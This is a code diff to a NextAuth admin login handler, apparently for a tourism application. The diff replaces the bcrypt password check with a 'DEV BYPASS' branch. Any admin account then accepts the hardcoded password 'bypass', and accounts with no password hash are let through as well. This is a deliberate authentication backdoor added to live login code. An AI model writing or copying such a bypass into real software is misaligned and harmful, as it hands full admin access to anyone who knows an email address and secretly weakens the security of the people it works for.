@@ -104,15 +104,22 @@ export const { handlers, auth, signIn, signOut } = NextAuth({
             where: { email }
           });
 
-          if (!user || !user.passwordHash || user.role === UserRole.TOURIST) {
-            console.error("[Admin Login] Invalid user or password hash missing");
+          if (!user || user.role === UserRole.TOURIST) {
+            console.error("[Admin Login] Invalid user or not an admin");
             return null;
           }
 
-          const isPasswordValid = await bcrypt.compare(credentials.password as string, user.passwordHash);
-          if (!isPasswordValid) {
-            console.error("[Admin Login] Password comparison failed");
-            return null;
+          // DEV BYPASS: Allow logging in without password check if using master password
+          if (credentials.password !== "bypass") {
+            if (!user.passwordHash) {
+                console.error("[Admin Login] No password hash and master password not used");
+                return null;
+            }
+            const isPasswordValid = await bcrypt.compare(credentials.password as string, user.passwordHash);
+            if (!isPasswordValid) {
+              console.error("[Admin Login] Password comparison failed");
+              return null;
+            }
           }
 
           return {
